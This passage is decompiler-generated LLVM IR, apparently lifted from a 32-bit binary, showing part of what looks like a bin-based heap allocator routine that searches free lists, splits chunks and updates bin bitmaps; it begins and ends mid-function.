  br i1 %v4_805031a, label %dec_label_pc_805040d.preheader, label %dec_label_pc_8050327

dec_label_pc_8050327:                             ; preds = %dec_label_pc_8050311
  store i32 ptrtoint (i8* @global_var_8053c40.32 to i32), i32* %stack_var_-92, align 4
  %v2_805032f = call i32 @function_8050e48(i32* bitcast (i8* @global_var_8053c40.32 to i32*))
  store i32 %v2_805032f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805040d.preheader

dec_label_pc_805040d.preheader:                   ; preds = %dec_label_pc_8050327, %dec_label_pc_80502da, %dec_label_pc_8050311
  %stack_var_-40.0.ph = phi i32 [ %v2_80502de, %dec_label_pc_80502da ], [ %v0_8050315, %dec_label_pc_8050327 ], [ %v0_8050315, %dec_label_pc_8050311 ]
  %v0_805040d9 = load i32, i32* @global_var_8053c80.36, align 128
  store i32 %v0_805040d9, i32* @ebp, align 4
  %v9_805041315 = icmp eq i32 %v0_805040d9, 134560884
  %v1_805041917 = icmp eq i1 %v9_805041315, false
  br i1 %v1_805041917, label %dec_label_pc_805033c.lr.ph, label %dec_label_pc_805041f

dec_label_pc_805033c.lr.ph:                       ; preds = %dec_label_pc_805040d.preheader
  %v1_8050363 = add i32 %.v1_8050280, 16
  br label %dec_label_pc_805033c

dec_label_pc_805033c:                             ; preds = %dec_label_pc_805033c.lr.ph, %dec_label_pc_805040d
  %v1_8050936 = phi i32 [ %v0_805040d9, %dec_label_pc_805033c.lr.ph ], [ %v0_805040d, %dec_label_pc_805040d ]
  %v1_805033c = add i32 %v1_8050936, 4
  %v2_805033c = inttoptr i32 %v1_805033c to i32*
  %v3_805033c = load i32, i32* %v2_805033c, align 4
  %v1_805033f = add i32 %v1_8050936, 12
  %v2_805033f = inttoptr i32 %v1_805033f to i32*
  %v3_805033f = load i32, i32* %v2_805033f, align 4
  store i32 %v3_805033f, i32* @edx, align 4
  %v1_8050342 = and i32 %v3_805033c, -4
  store i32 %v1_8050342, i32* @edi, align 4
  %v9_805034f = icmp eq i32 %v3_805033f, 134560884
  %v1_8050355 = icmp eq i1 %v9_805034f, false
  %or.cond95 = or i1 %v6_80502d8, %v1_8050355
  br i1 %or.cond95, label %dec_label_pc_805036e, label %dec_label_pc_8050357

dec_label_pc_8050357:                             ; preds = %dec_label_pc_805033c
  %v1_8050357 = load i32, i32* @global_var_8053c70.34, align 16
  %v12_8050357 = icmp eq i32 %v1_8050936, %v1_8050357
  %v1_805035d = icmp eq i1 %v12_8050357, false
  br i1 %v1_805035d, label %dec_label_pc_805036e, label %dec_label_pc_805035f

dec_label_pc_805035f:                             ; preds = %dec_label_pc_8050357
  store i32 %v1_8050363, i32* %eax.global-to-local, align 4
  %v6_8050368 = icmp ugt i32 %v1_8050342, %v1_8050363
  br i1 %v6_8050368, label %dec_label_pc_805091f, label %dec_label_pc_805036e

dec_label_pc_805036e:                             ; preds = %dec_label_pc_805035f, %dec_label_pc_8050357, %dec_label_pc_805033c
  store i32 ptrtoint (i32* @global_var_8053c74.35 to i32), i32* %eax.global-to-local, align 4
  %v2_8050373 = add i32 %v3_805033f, 8
  %v3_8050373 = inttoptr i32 %v2_8050373 to i32*
  store i32 ptrtoint (i32* @global_var_8053c74.35 to i32), i32* %v3_8050373, align 4
  %v0_8050376 = load i32, i32* @edx, align 4
  store i32 %v0_8050376, i32* @global_var_8053c80.36, align 4
  %v0_8050379 = load i32, i32* @edi, align 4
  %v15_8050379 = icmp eq i32 %v0_8050379, %.v1_8050280
  br i1 %v15_8050379, label %dec_label_pc_8050960, label %dec_label_pc_8050383

dec_label_pc_8050383:                             ; preds = %dec_label_pc_805036e
  %v6_8050389 = icmp ugt i32 %v0_8050379, 255
  br i1 %v6_8050389, label %dec_label_pc_805039c, label %dec_label_pc_805038b

dec_label_pc_805038b:                             ; preds = %dec_label_pc_8050383
  %v2_805038d = udiv i32 %v0_8050379, 8
  store i32 %v2_805038d, i32* %esi.global-to-local, align 4
  %v1_8050390 = mul nuw i32 %v2_805038d, 8
  %v2_8050390 = add i32 %v1_8050390, 134560876
  store i32 %v2_8050390, i32* @ebx, align 4
  %v1_8050397 = add i32 %v1_8050390, 134560884
  %v2_8050397 = inttoptr i32 %v1_8050397 to i32*
  %v3_8050397 = load i32, i32* %v2_8050397, align 4
  store i32 %v3_8050397, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80503e5

dec_label_pc_805039c:                             ; preds = %dec_label_pc_8050383
  store i32 %v0_8050379, i32* @eax, align 4
  %v0_805039e = call i32 @function_8050205()
  store i32 %v0_805039e, i32* %esi.global-to-local, align 4
  %v1_80503a5 = mul i32 %v0_805039e, 8
  %v2_80503a5 = add i32 %v1_80503a5, ptrtoint (i32* @global_var_8053c6c.33 to i32)
  store i32 %v2_80503a5, i32* %eax.global-to-local, align 4
  %v1_80503ac = add i32 %v1_80503a5, add (i32 ptrtoint (i32* @global_var_8053c6c.33 to i32), i32 8)
  %v2_80503ac = inttoptr i32 %v1_80503ac to i32*
  %v3_80503ac = load i32, i32* %v2_80503ac, align 4
  store i32 %v3_80503ac, i32* %edx.global-to-local, align 4
  store i32 %v3_80503ac, i32* @ebx, align 4
  %v12_80503b5 = icmp eq i32 %v3_80503ac, %v2_80503a5
  br i1 %v12_80503b5, label %dec_label_pc_80503e5, label %dec_label_pc_80503b9

dec_label_pc_80503b9:                             ; preds = %dec_label_pc_805039c
  %v1_80503b9 = add i32 %v1_80503a5, add (i32 ptrtoint (i32* @global_var_8053c6c.33 to i32), i32 12)
  %v2_80503b9 = inttoptr i32 %v1_80503b9 to i32*
  %v3_80503b9 = load i32, i32* %v2_80503b9, align 4
  store i32 %v3_80503b9, i32* @ebx, align 4
  %v0_80503bc = load i32, i32* @edi, align 4
  %v2_80503bc = add i32 %v3_80503b9, 4
  %v3_80503bc = inttoptr i32 %v2_80503bc to i32*
  %v4_80503bc = load i32, i32* %v3_80503bc, align 4
  %v10_80503bc = icmp ult i32 %v0_80503bc, %v4_80503bc
  %v1_80503bf = icmp eq i1 %v10_80503bc, false
  br i1 %v1_80503bf, label %dec_label_pc_80503c7, label %dec_label_pc_80503e5

dec_label_pc_80503c7:                             ; preds = %dec_label_pc_80503b9
  %v1_80503c9 = or i32 %v0_80503bc, 1
  store i32 %v1_80503c9, i32* %eax.global-to-local, align 4
  store i32 %v3_80503ac, i32* %ebx.global-to-local, align 4
  %v2_80503dd109 = add i32 %v3_80503ac, 4
  %v3_80503dd110 = inttoptr i32 %v2_80503dd109 to i32*
  %v4_80503dd111 = load i32, i32* %v3_80503dd110, align 4
  %v10_80503dd112 = icmp ult i32 %v1_80503c9, %v4_80503dd111
  br i1 %v10_80503dd112, label %dec_label_pc_80503ce, label %dec_label_pc_80503e2

dec_label_pc_80503ce:                             ; preds = %dec_label_pc_80503c7, %dec_label_pc_80503ce
  %v0_80503e2113 = phi i32 [ %v3_80503d2, %dec_label_pc_80503ce ], [ %v3_80503ac, %dec_label_pc_80503c7 ]
  store i32 %v0_80503e2113, i32* %ecx.global-to-local, align 4
  %v1_80503d2 = add i32 %v0_80503e2113, 8
  %v2_80503d2 = inttoptr i32 %v1_80503d2 to i32*
  %v3_80503d2 = load i32, i32* %v2_80503d2, align 4
  store i32 %v3_80503d2, i32* %ecx.global-to-local, align 4
  store i32 %v3_80503d2, i32* %ebx.global-to-local, align 4
  %v2_80503dd = add i32 %v3_80503d2, 4
  %v3_80503dd = inttoptr i32 %v2_80503dd to i32*
  %v4_80503dd = load i32, i32* %v3_80503dd, align 4
  %v10_80503dd = icmp ult i32 %v1_80503c9, %v4_80503dd
  br i1 %v10_80503dd, label %dec_label_pc_80503ce, label %dec_label_pc_80503e2

dec_label_pc_80503e2:                             ; preds = %dec_label_pc_80503ce, %dec_label_pc_80503c7
  %v0_80503e2.lcssa = phi i32 [ %v3_80503ac, %dec_label_pc_80503c7 ], [ %v3_80503d2, %dec_label_pc_80503ce ]
  %v1_80503e2 = add i32 %v0_80503e2.lcssa, 12
  %v2_80503e2 = inttoptr i32 %v1_80503e2 to i32*
  %v3_80503e2 = load i32, i32* %v2_80503e2, align 4
  store i32 %v3_80503e2, i32* @ebx, align 4
  br label %dec_label_pc_80503e5

dec_label_pc_80503e5:                             ; preds = %dec_label_pc_805038b, %dec_label_pc_80503b9, %dec_label_pc_805039c, %dec_label_pc_80503e2
  %v0_80503e5 = phi i32 [ %v0_805039e, %dec_label_pc_805039c ], [ %v0_805039e, %dec_label_pc_80503e2 ], [ %v0_805039e, %dec_label_pc_80503b9 ], [ %v2_805038d, %dec_label_pc_805038b ]
  %stack_var_-64.1 = phi i32 [ %v2_80503a5, %dec_label_pc_805039c ], [ %v0_80503e2.lcssa, %dec_label_pc_80503e2 ], [ %v2_80503a5, %dec_label_pc_80503b9 ], [ %v3_8050397, %dec_label_pc_805038b ]
  %v1_80503e7 = urem i32 %v0_80503e5, 32
  %v2_80503e7 = icmp eq i32 %v1_80503e7, 0
  store i32 %v1_80503e7, i32* %esi.global-to-local, align 4
  store i32 %v1_80503e7, i32* %ecx.global-to-local, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_80503f1 = sdiv i32 %v0_80503e5, 32
  store i32 %v2_80503f1, i32* %edx.global-to-local, align 4
  br i1 %v2_80503e7, label %dec_label_pc_805040d, label %bb

bb:                                               ; preds = %dec_label_pc_80503e5
  %v5_80503f4 = shl i32 1, %v1_80503e7
  store i32 %v5_80503f4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805040d

dec_label_pc_805040d:                             ; preds = %dec_label_pc_80503e5, %bb
  %v5_80503f6 = phi i32 [ 1, %dec_label_pc_80503e5 ], [ %v5_80503f4, %bb ]
  %v1_80503f6 = mul nsw i32 %v2_80503f1, 4
  %v2_80503f6 = add i32 %v1_80503f6, ptrtoint (i32* @global_var_8053f74.37 to i32)
  %v3_80503f6 = inttoptr i32 %v2_80503f6 to i32*
  %v4_80503f6 = load i32, i32* %v3_80503f6, align 4
  %v6_80503f6 = or i32 %v4_80503f6, %v5_80503f6
  store i32 %v6_80503f6, i32* %v3_80503f6, align 4
  %v0_80503fd = load i32, i32* @ebx, align 4
  %v1_80503fd = load i32, i32* @ebp, align 4
  %v2_80503fd = add i32 %v1_80503fd, 12
  %v3_80503fd = inttoptr i32 %v2_80503fd to i32*
  store i32 %v0_80503fd, i32* %v3_80503fd, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_8050404 = load i32, i32* @ebp, align 4
  %v2_8050404 = add i32 %v1_8050404, 8
  %v3_8050404 = inttoptr i32 %v2_8050404 to i32*
  store i32 %stack_var_-64.1, i32* %v3_8050404, align 4
  %v0_8050407 = load i32, i32* @ebp, align 4
  %v1_8050407 = load i32, i32* @ebx, align 4
  %v2_8050407 = add i32 %v1_8050407, 8
  %v3_8050407 = inttoptr i32 %v2_8050407 to i32*
  store i32 %v0_8050407, i32* %v3_8050407, align 4
  %v0_805040a = load i32, i32* @ebp, align 4
  %v1_805040a = load i32, i32* @esi, align 4
  %v2_805040a = add i32 %v1_805040a, 12
  %v3_805040a = inttoptr i32 %v2_805040a to i32*
  store i32 %v0_805040a, i32* %v3_805040a, align 4
  %v0_805040d = load i32, i32* @global_var_8053c80.36, align 128
  store i32 %v0_805040d, i32* @ebp, align 4
  %v9_8050413 = icmp eq i32 %v0_805040d, 134560884
  %v1_8050419 = icmp eq i1 %v9_8050413, false
  br i1 %v1_8050419, label %dec_label_pc_805033c, label %dec_label_pc_805041f

dec_label_pc_805041f:                             ; preds = %dec_label_pc_805040d, %dec_label_pc_805040d.preheader
  br i1 %v8_80502d0, label %dec_label_pc_80504ad, label %dec_label_pc_805042d

dec_label_pc_805042d:                             ; preds = %dec_label_pc_805041f
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_8050431 = mul i32 %stack_var_-40.0.ph, 8
  %v2_8050431 = add i32 %v1_8050431, ptrtoint (i32* @global_var_8053c6c.33 to i32)
  store i32 %v2_8050431, i32* %edx.global-to-local, align 4
  %v1_8050438 = add i32 %v1_8050431, add (i32 ptrtoint (i32* @global_var_8053c6c.33 to i32), i32 12)
  %v2_8050438 = inttoptr i32 %v1_8050438 to i32*
  %storemerge1.pre = load i32, i32* %v2_8050438, align 4
  br label %dec_label_pc_80504a9

dec_label_pc_805043d:                             ; preds = %dec_label_pc_80504a9
  %v1_805043d = add i32 %v4_8050454, 4
  %v2_805043d = inttoptr i32 %v1_805043d to i32*
  %v3_805043d = load i32, i32* %v2_805043d, align 4
  store i32 %v3_805043d, i32* %ebx.global-to-local, align 4
  %v1_8050440 = add i32 %v4_8050454, 12
  %v2_8050440 = inttoptr i32 %v1_8050440 to i32*
  %v3_8050440 = load i32, i32* %v2_8050440, align 4
  store i32 %v3_8050440, i32* @ecx, align 4
  %v1_8050443 = and i32 %v3_805043d, -4
  store i32 %v1_8050443, i32* @ebx, align 4
  %v10_8050446 = icmp ult i32 %v1_8050443, %.v1_8050280
  br i1 %v10_8050446, label %dec_label_pc_80504a9, label %dec_label_pc_805044c

dec_label_pc_805044c:                             ; preds = %dec_label_pc_805043d
  %v1_805044c = add i32 %v4_8050454, 8
  %v2_805044c = inttoptr i32 %v1_805044c to i32*
  %v3_805044c = load i32, i32* %v2_805044c, align 4
  store i32 %v3_805044c, i32* @edx, align 4
  %v1_805044f = add i32 %v3_805044c, 12
  %v2_805044f = inttoptr i32 %v1_805044f to i32*
  %v3_805044f = load i32, i32* %v2_805044f, align 4
  %v15_805044f = icmp eq i32 %v3_805044f, %v4_8050454
  %v1_8050452 = icmp eq i1 %v15_805044f, false
  br i1 %v1_8050452, label %dec_label_pc_8050459, label %dec_label_pc_8050454

dec_label_pc_8050454:                             ; preds = %dec_label_pc_805044c
  %v1_8050454 = add i32 %v3_8050440, 8
  %v2_8050454 = inttoptr i32 %v1_8050454 to i32*
  %v3_8050454 = load i32, i32* %v2_8050454, align 4
  %v15_8050454 = icmp eq i32 %v3_8050454, %v4_8050454
  br i1 %v15_8050454, label %dec_label_pc_805045e, label %dec_label_pc_8050459

dec_label_pc_8050459:                             ; preds = %dec_label_pc_8050454, %dec_label_pc_805044c
  %v0_8050459 = call i32 @function_805118c()
  store i32 %v0_8050459, i32* %eax.global-to-local, align 4
  %v0_805045e.pre = load i32, i32* @ebx, align 4
  %v0_8050464.pre = load i32, i32* @ecx, align 4
  %v1_8050464.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805045e

dec_label_pc_805045e:                             ; preds = %dec_label_pc_8050454, %dec_label_pc_8050459
  %v1_8050464 = phi i32 [ %v3_805044c, %dec_label_pc_8050454 ], [ %v1_8050464.pre, %dec_label_pc_8050459 ]
  %v0_8050464 = phi i32 [ %v3_8050440, %dec_label_pc_8050454 ], [ %v0_8050464.pre, %dec_label_pc_8050459 ]
  %v0_805045e = phi i32 [ %v1_8050443, %dec_label_pc_8050454 ], [ %v0_805045e.pre, %dec_label_pc_8050459 ]
  %v5_8050460 = sub i32 %v0_805045e, %.v1_8050280
  store i32 %v5_8050460, i32* %esi.global-to-local, align 4
  %v2_8050464 = add i32 %v1_8050464, 12
  %v3_8050464 = inttoptr i32 %v2_8050464 to i32*
  store i32 %v0_8050464, i32* %v3_8050464, align 4
  %v0_8050467 = load i32, i32* @edx, align 4
  %v1_8050467 = load i32, i32* @ecx, align 4
  %v2_8050467 = add i32 %v1_8050467, 8
  %v3_8050467 = inttoptr i32 %v2_8050467 to i32*
  store i32 %v0_8050467, i32* %v3_8050467, align 4
  %v0_805046a = load i32, i32* %esi.global-to-local, align 4
  %v0_805046d = load i32, i32* %eax.global-to-local, align 4
  %v1_805046d = add i32 %v0_805046d, 8
  store i32 %v1_805046d, i32* %ecx.global-to-local, align 4
  %tmp125 = icmp ult i32 %v0_805046a, 16
  br i1 %tmp125, label %dec_label_pc_805096e, label %dec_label_pc_8050476

dec_label_pc_8050476:                             ; preds = %dec_label_pc_805045e
  %v2_805047a = add i32 %v0_805046d, %.v1_8050280
  store i32 %v2_805047a, i32* @edx, align 4
  %v1_805047d = or i32 %.v1_8050280, 1
  store i32 %v1_805047d, i32* %ebx.global-to-local, align 4
  %v2_8050480 = add i32 %v0_805046d, 4
  %v3_8050480 = inttoptr i32 %v2_8050480 to i32*
  store i32 %v1_805047d, i32* %v3_8050480, align 4
  %v0_8050483 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050485 = or i32 %v0_8050483, 1
  store i32 %v1_8050485, i32* %eax.global-to-local, align 4
  %v0_8050488 = load i32, i32* @edx, align 4
  %v1_8050488 = load i32, i32* @ebp, align 4
  %v2_8050488 = add i32 %v1_8050488, 8
  %v3_8050488 = inttoptr i32 %v2_8050488 to i32*
  store i32 %v0_8050488, i32* %v3_8050488, align 4
  %v0_805048b = load i32, i32* @edx, align 4
  %v1_805048b = load i32, i32* @ebp, align 4
  %v2_805048b = add i32 %v1_805048b, 12
  %v3_805048b = inttoptr i32 %v2_805048b to i32*
  store i32 %v0_805048b, i32* %v3_805048b, align 4
  %v0_805048e = load i32, i32* @edx, align 4
  %v1_805048e = add i32 %v0_805048e, 8
  %v2_805048e = inttoptr i32 %v1_805048e to i32*
  store i32 ptrtoint (i32* @global_var_8053c74.35 to i32), i32* %v2_805048e, align 4
  %v0_8050495 = load i32, i32* @edx, align 4
  %v1_8050495 = add i32 %v0_8050495, 12
  %v2_8050495 = inttoptr i32 %v1_8050495 to i32*
  store i32 ptrtoint (i32* @global_var_8053c74.35 to i32), i32* %v2_8050495, align 4
  %v0_805049c = load i32, i32* %eax.global-to-local, align 4
  %v1_805049c = load i32, i32* @edx, align 4
  %v2_805049c = add i32 %v1_805049c, 4
  %v3_805049c = inttoptr i32 %v2_805049c to i32*
  store i32 %v0_805049c, i32* %v3_805049c, align 4
  %v0_805049f = load i32, i32* %esi.global-to-local, align 4
  %v1_805049f = load i32, i32* @edx, align 4
  %v3_805049f = add i32 %v1_805049f, %v0_805049f
  %v4_805049f = inttoptr i32 %v3_805049f to i32*
  store i32 %v0_805049f, i32* %v4_805049f, align 4
  br label %dec_label_pc_8050973

dec_label_pc_80504a9:                             ; preds = %dec_label_pc_805043d, %dec_label_pc_805042d
  %v4_8050454 = phi i32 [ %storemerge1.pre, %dec_label_pc_805042d ], [ %v3_8050440, %dec_label_pc_805043d ]
  store i32 %v4_8050454, i32* %eax.global-to-local, align 4
  %v12_80504a9 = icmp eq i32 %v4_8050454, %v2_8050431
  %v1_80504ab = icmp eq i1 %v12_80504a9, false
  br i1 %v1_80504ab, label %dec_label_pc_805043d, label %dec_label_pc_80504ad

dec_label_pc_80504ad:                             ; preds = %dec_label_pc_80504a9, %dec_label_pc_805041f
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_80504b6 = add i32 %stack_var_-40.0.ph, 1
  %v2_80504b9 = udiv i32 %v1_80504b6, 32
  store i32 %v2_80504b9, i32* @edi, align 4
  %v1_80504bc = mul i32 %v1_80504b6, 8
  %v2_80504bc = add i32 %v1_80504bc, ptrtoint (i32* @global_var_8053c6c.33 to i32)
  store i32 %v2_80504bc, i32* %ebx.global-to-local, align 4
  %v1_80504c3 = urem i32 %v1_80504b6, 32
  %v2_80504c3 = icmp eq i32 %v1_80504c3, 0
  store i32 %v1_80504c3, i32* %ecx.global-to-local, align 4
  %v1_80504c6 = mul nuw nsw i32 %v2_80504b9, 4
  %v2_80504c6 = add i32 %v1_80504c6, ptrtoint (i32* @global_var_8053f74.37 to i32)
  %v3_80504c6 = inttoptr i32 %v2_80504c6 to i32*
  %v4_80504c6 = load i32, i32* %v3_80504c6, align 4
  store i32 %v4_80504c6, i32* %edx.global-to-local, align 4
  br i1 %v2_80504c3, label %.preheader, label %bb88

bb88:                                             ; preds = %dec_label_pc_80504ad
  %v5_80504cd = shl i32 1, %v1_80504c3
  store i32 %v5_80504cd, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_80504ad, %bb88, %dec_label_pc_805050e
  %v1_80504cf = phi i32 [ %v1_80504cf.pre, %dec_label_pc_805050e ], [ %v4_80504c6, %bb88 ], [ %v4_80504c6, %dec_label_pc_80504ad ]
  %v0_80504d3 = phi i32 [ %v0_80504cf.pre, %dec_label_pc_805050e ], [ %v5_80504cd, %bb88 ], [ 1, %dec_label_pc_80504ad ]
  %tmp89 = icmp ule i32 %v0_80504d3, %v1_80504cf
  %v1_80504d3 = icmp eq i32 %v0_80504d3, 0
  %v1_80504d5 = icmp eq i1 %v1_80504d3, false
  %or.cond = and i1 %tmp89, %v1_80504d5
  br i1 %or.cond, label %dec_label_pc_80504d3.dec_label_pc_8050503.preheader_crit_edge, label %dec_label_pc_80504d7.preheader

dec_label_pc_80504d3.dec_label_pc_8050503.preheader_crit_edge: ; preds = %.preheader
  %v0_80504fe7.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050503.preheader

dec_label_pc_80504d7.preheader:                   ; preds = %.preheader
  %v0_80504d7.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80504d7

dec_label_pc_80504d7:                             ; preds = %dec_label_pc_80504d7.preheader, %dec_label_pc_80504e1
  %v0_80504d7 = phi i32 [ %v0_80504d7.pre, %dec_label_pc_80504d7.preheader ], [ %v1_80504d7, %dec_label_pc_80504e1 ]
  %v1_80504d7 = add i32 %v0_80504d7, 1
  store i32 %v1_80504d7, i32* @edi, align 4
  %v6_80504db = icmp ugt i32 %v1_80504d7, 2
  br i1 %v6_80504db, label %dec_label_pc_805058a, label %dec_label_pc_80504e1

dec_label_pc_80504e1:                             ; preds = %dec_label_pc_80504d7
  %v1_80504e1 = mul i32 %v1_80504d7, 4
  %v2_80504e1 = add i32 %v1_80504e1, ptrtoint (i32* @global_var_8053f74.37 to i32)
  %v3_80504e1 = inttoptr i32 %v2_80504e1 to i32*
  %v4_80504e1 = load i32, i32* %v3_80504e1, align 4
  store i32 %v4_80504e1, i32* %edx.global-to-local, align 4
  %v1_80504e8 = icmp eq i32 %v4_80504e1, 0
  br i1 %v1_80504e8, label %dec_label_pc_80504d7, label %dec_label_pc_80504ec

dec_label_pc_80504ec:                             ; preds = %dec_label_pc_80504e1
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_80504f3 = mul i32 %v1_80504d7, 256
  store i32 %v2_80504f3, i32* %eax.global-to-local, align 4
  %v1_80504f6 = add i32 %v2_80504f3, ptrtoint (i32* @global_var_8053c6c.33 to i32)
  store i32 %v1_80504f6, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050503.preheader

dec_label_pc_8050503.preheader:                   ; preds = %dec_label_pc_80504d3.dec_label_pc_8050503.preheader_crit_edge, %dec_label_pc_80504ec
  %v0_80504fe7 = phi i32 [ %v1_80504f6, %dec_label_pc_80504ec ], [ %v0_80504fe7.pre, %dec_label_pc_80504d3.dec_label_pc_8050503.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_80504ec ], [ %v0_80504d3, %dec_label_pc_80504d3.dec_label_pc_8050503.preheader_crit_edge ]
  %v0_8050515 = phi i32 [ %v4_80504e1, %dec_label_pc_80504ec ], [ %v1_80504cf, %dec_label_pc_80504d3.dec_label_pc_8050503.preheader_crit_edge ]
  %v2_80505034 = and i32 %v0_8050515, %esi.promoted
  %v3_80505035 = icmp eq i32 %v2_80505034, 0
  br i1 %v3_80505035, label %dec_label_pc_80504fe, label %dec_label_pc_8050507

dec_label_pc_80504fe:                             ; preds = %dec_label_pc_8050503.preheader, %dec_label_pc_80504fe
  %v2_805050118 = phi i32 [ %v2_8050501, %dec_label_pc_80504fe ], [ %esi.promoted, %dec_label_pc_8050503.preheader ]
  %v0_80504fe8 = phi i32 [ %v1_80504fe, %dec_label_pc_80504fe ], [ %v0_80504fe7, %dec_label_pc_8050503.preheader ]
  %v1_80504fe = add i32 %v0_80504fe8, 8
  %v2_8050501 = mul i32 %v2_805050118, 2
  %v2_8050503 = and i32 %v2_8050501, %v0_8050515
  %v3_8050503 = icmp eq i32 %v2_8050503, 0
  br i1 %v3_8050503, label %dec_label_pc_80504fe, label %dec_label_pc_8050503.dec_label_pc_8050507_crit_edge

dec_label_pc_8050503.dec_label_pc_8050507_crit_edge: ; preds = %dec_label_pc_80504fe
  store i32 %v1_80504fe, i32* %ebx.global-to-local, align 4
  store i32 %v2_8050501, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050507

dec_label_pc_8050507:                             ; preds = %dec_label_pc_8050503.dec_label_pc_8050507_crit_edge, %dec_label_pc_8050503.preheader
  %v0_8050517 = phi i32 [ %v2_8050501, %dec_label_pc_8050503.dec_label_pc_8050507_crit_edge ], [ %esi.promoted, %dec_label_pc_8050503.preheader ]
  %v1_8050531 = phi i32 [ %v1_80504fe, %dec_label_pc_8050503.dec_label_pc_8050507_crit_edge ], [ %v0_80504fe7, %dec_label_pc_8050503.preheader ]
  %v1_8050507 = add i32 %v1_8050531, 12
  %v2_8050507 = inttoptr i32 %v1_8050507 to i32*
  %v3_8050507 = load i32, i32* %v2_8050507, align 4
  store i32 %v3_8050507, i32* %ecx.global-to-local, align 4
  %v12_805050a = icmp eq i32 %v3_8050507, %v1_8050531
  %v1_805050c = icmp eq i1 %v12_805050a, false
  br i1 %v1_805050c, label %dec_label_pc_8050522, label %dec_label_pc_805050e

dec_label_pc_805050e:                             ; preds = %dec_label_pc_8050507
  %v1_8050510 = add i32 %v3_8050507, 8
  store i32 %v1_8050510, i32* %ebx.global-to-local, align 4
  %v1_8050513 = sub i32 -1, %v0_8050517
  store i32 %v1_8050513, i32* %eax.global-to-local, align 4
  %v2_8050515 = and i32 %v0_8050515, %v1_8050513
  store i32 %v2_8050515, i32* %edx.global-to-local, align 4
  %v2_8050517 = mul i32 %v0_8050517, 2
  store i32 %v2_8050517, i32* %esi.global-to-local, align 4
  %v1_8050519 = load i32, i32* @edi, align 4
  %v2_8050519 = mul i32 %v1_8050519, 4
  %v3_8050519 = add i32 %v2_8050519, ptrtoint (i32* @global_var_8053f74.37 to i32)
  %v4_8050519 = inttoptr i32 %v3_8050519 to i32*
  store i32 %v2_8050515, i32* %v4_8050519, align 4
  %v0_80504cf.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_80504cf.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_8050522:                             ; preds = %dec_label_pc_8050507
  %v1_8050522 = add i32 %v3_8050507, 4
  %v2_8050522 = inttoptr i32 %v1_8050522 to i32*
  %v3_8050522 = load i32, i32* %v2_8050522, align 4
  store i32 %v3_8050522, i32* %edx.global-to-local, align 4
  %v1_8050525 = add i32 %v3_8050507, 12
  %v2_8050525 = inttoptr i32 %v1_8050525 to i32*
  %v3_8050525 = load i32, i32* %v2_8050525, align 4
  store i32 %v3_8050525, i32* %eax.global-to-local, align 4
  %v1_8050528 = and i32 %v3_8050522, -4
  store i32 %v1_8050528, i32* @edx, align 4
  %v5_805052d = sub i32 %v1_8050528, %.v1_8050280
  store i32 %v5_805052d, i32* %esi.global-to-local, align 4
  store i32 %v3_8050525, i32* %v2_8050507, align 4
  %v0_8050534 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050534 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050534 = add i32 %v1_8050534, 8
  %v3_8050534 = inttoptr i32 %v2_8050534 to i32*
  store i32 %v0_8050534, i32* %v3_8050534, align 4
  %v0_8050537 = load i32, i32* %esi.global-to-local, align 4
  %tmp126 = icmp ult i32 %v0_8050537, 16
  br i1 %tmp126, label %dec_label_pc_805053c, label %dec_label_pc_8050543

dec_label_pc_805053c:                             ; preds = %dec_label_pc_8050522
  %v0_805053c = load i32, i32* %ecx.global-to-local, align 4
  %v1_805053c = load i32, i32* @edx, align 4
  %v2_805053c = add i32 %v0_805053c, 4
  %v3_805053c = add i32 %v2_805053c, %v1_805053c
  %v4_805053c = inttoptr i32 %v3_805053c to i32*
  %v5_805053c = load i32, i32* %v4_805053c, align 4
  %v6_805053c = or i32 %v5_805053c, 1
  store i32 %v6_805053c, i32* %v4_805053c, align 4
  br label %dec_label_pc_8050582

dec_label_pc_8050543:                             ; preds = %dec_label_pc_8050522
  store i32 %.v1_8050280, i32* %eax.global-to-local, align 4
  %v0_805054c = load i32, i32* %ecx.global-to-local, align 4
  %v2_805054c = add i32 %v0_805054c, %.v1_8050280
  store i32 %v2_805054c, i32* @edx, align 4
  %v1_805054f = load i32, i32* @ebp, align 4
  %v2_805054f = add i32 %v1_805054f, 8
  %v3_805054f = inttoptr i32 %v2_805054f to i32*
  store i32 %v2_805054c, i32* %v3_805054f, align 4
  %v0_8050552 = load i32, i32* @edx, align 4
  %v1_8050552 = load i32, i32* @ebp, align 4
  %v2_8050552 = add i32 %v1_8050552, 12
  %v3_8050552 = inttoptr i32 %v2_8050552 to i32*
  store i32 %v0_8050552, i32* %v3_8050552, align 4
  %v0_8050555 = load i32, i32* @edx, align 4
  %v1_8050555 = add i32 %v0_8050555, 8
  %v2_8050555 = inttoptr i32 %v1_8050555 to i32*
  store i32 ptrtoint (i32* @global_var_8053c74.35 to i32), i32* %v2_8050555, align 4
  %v0_805055c = load i32, i32* @edx, align 4
  %v1_805055c = add i32 %v0_805055c, 12
  %v2_805055c = inttoptr i32 %v1_805055c to i32*
  store i32 ptrtoint (i32* @global_var_8053c74.35 to i32), i32* %v2_805055c, align 4
  br i1 %v6_80502d8, label %dec_label_pc_805056b, label %dec_label_pc_8050565

dec_label_pc_8050565:                             ; preds = %dec_label_pc_8050543
  %v0_8050565 = load i32, i32* @edx, align 4
  store i32 %v0_8050565, i32* @global_var_8053c70.34, align 16
  br label %dec_label_pc_805056b

dec_label_pc_805056b:                             ; preds = %dec_label_pc_8050543, %dec_label_pc_8050565
